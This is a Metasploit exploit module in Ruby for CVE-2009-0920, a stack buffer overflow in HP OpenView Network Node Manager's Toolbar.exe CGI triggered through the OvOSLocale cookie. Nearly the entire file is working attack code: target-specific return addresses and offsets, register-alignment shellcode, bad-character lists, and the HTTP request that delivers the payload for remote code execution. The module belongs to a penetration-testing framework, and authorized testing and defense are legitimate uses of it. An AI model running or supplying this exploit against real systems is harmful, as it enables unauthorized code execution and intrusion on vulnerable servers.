# $Id: hp_nnm_toolbar_02.rb 13194 2011-07-16 05:21:20Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Network Node Manager Toolbar.exe CGI Cookie Handling Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.0
                and 7.53.  By sending a CGI request with a specially OvOSLocale cookie to Toolbar.exe, an
                attacker may be able to execute arbitrary code.  Please note that this module only works
                against a specific build (ie. NNM 7.53_01195)
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13194 $&#039;,
            &#039;Author&#039;         =>
                [
                    &#039;Oren Isacson&#039;, # original discovery
                    &#039;juan vazquez&#039;, # metasploit module (7.0 target)
                    &#039;sinn3r&#039;,       # 7.53_01195 target
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-0920&#039; ],
                    [ &#039;OSVDB&#039;, &#039;53242&#039; ],
                    [ &#039;BID&#039;, &#039;34294&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.coresecurity.com/content/openview-buffer-overflows&#039;]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;          => 4000,
                    &#039;BadChars&#039;       => "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x7f\x3b\x2b",
                    &#039;DisableNops&#039;    => true, # no need
                    &#039;EncoderType&#039;    => Msf::Encoder::Type::AlphanumMixed,
                    &#039;EncoderOptions&#039; =>
                    {
                        &#039;BufferRegister&#039; => &#039;EDX&#039;
                    }
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        #Windows XP SP3
                        &#039;HP OpenView Network Node Manager Release B.07.00&#039;,
                        {
                            &#039;Ret&#039; => 0x5A212147, # ovsnmp.dll call esp
                            &#039;Offset&#039; => 0xFC,  # until EIP
                            # Pointer to string with length < 0x100
                            # Avoid crash before vulnerable function returns
                            #&#039;ReadAddress&#039; => 0x5A03A225,# ov.dll
                            &#039;ReadAddress&#039; => 0x5A03A225,# ov.dll
                            &#039;EDXAdjust&#039; => 0x17,
                            # 0x8 => offset until "0x90" nops
                            # 0x4 => "0x90" nops
                            # 0x2 => len(push esp, pop edx)
                            # 0x3 => len(sub)
                            # 0x6 => len(add)
                        }
                    ],
                    [
                        #Windows Server 2003
                        &#039;HP OpenView Network Node Manager 7.53 Patch 01195&#039;,
                        {
                            &#039;Eax&#039;       => 0x5a456eac,   #Readable address for CMP BYTE PTR DS:[EAX],0
                            &#039;EaxOffset&#039; => 251,          #Offset to overwrite EAX
                            &#039;Ret&#039;       => 0x5A23377C,   #CALL EDI
                            &#039;Max&#039;       => 8000,         #Max buffer size
                        }
                    ]
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 21 2009&#039;))
 
        register_options( [ Opt::RPORT(80) ], self.class )
    end
 
    def exploit
 
        if target.name =~ /7\.53/
 
            #EDX alignment for alphanumeric shellcode
            #payload is in EDI first.  We exchange it with EDX, align EDX, and then
            #jump to it.
            align  = "\x87\xfa"      #xchg edi,edx
            align << "\x80\xc2\x27"  #add dl,0x27
            align << "\xff\xe2"      #jmp edx
 
            #Add the alignment code to payload
            p = align + payload.encoded
 
            sploit  = &#039;en_US&#039;
            sploit << rand_text_alphanumeric(247)
            sploit << [target.ret].pack(&#039;V*&#039;)
            sploit << rand_text_alphanumeric(target[&#039;EaxOffset&#039;]-sploit.length+&#039;en_US&#039;.length)
            sploit << [target[&#039;Eax&#039;]].pack(&#039;V*&#039;)
            sploit << rand_text_alphanumeric(3200)
            sploit << make_nops(100 - align.length)
            sploit << align
            sploit << p
            sploit << rand_text_alphanumeric(target[&#039;Max&#039;]-sploit.length)
 
        elsif target.name =~ /B\.07\.00/
 
            edx = Rex::Arch::X86::EDX
 
            sploit = "en_US"
            sploit << rand_text_alphanumeric(target[&#039;Offset&#039;] - "en_US".length, payload_badchars)
            sploit << [target.ret].pack(&#039;V&#039;)
            sploit << [target[&#039;ReadAddress&#039;]].pack(&#039;V&#039;)
            sploit << "\x90\x90\x90\x90"
            # Get in EDX a pointer to the shellcode start
            sploit << "\x54" # push esp
            sploit << "\x5A" # pop edx
            sploit << Rex::Arch::X86.sub(-(target[&#039;EDXAdjust&#039;]), edx, payload_badchars, false, true)
            sploit << "\x81\xc4\x48\xf4\xff\xff" # add esp, -3000
            sploit << payload.encoded
 
        end
 
        #Send the malicious request to /OvCgi/ToolBar.exe
        #If the buffer contains a badchar, NNM 7.53 will return a "400 Bad Request".
        #If the exploit causes ToolBar.exe to crash, NNM returns "error in CGI Application"
        send_request_raw({
            &#039;uri&#039;     => "/OvCgi/Toolbar.exe",
            &#039;method&#039;  => "GET",
            &#039;cookie&#039;  => "OvOSLocale=" + sploit + "; OvAcceptLang=en-usa",
        }, 20)
 
        handler
        disconnect
    end
 
end
 
 
=begin
NNM B.07.00&#039;s badchar set:
00 0D 0A 20 3B 3D 2C 2B
 
NNM 7.53_01195&#039;s badchar set:
01 02 03 04 05 06 07 08 0a 0b 0c 0d 0e 0f 10 11    ................
12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 7f       ...............
3b = delimiter
2b = gets converted to 0x2b
=end



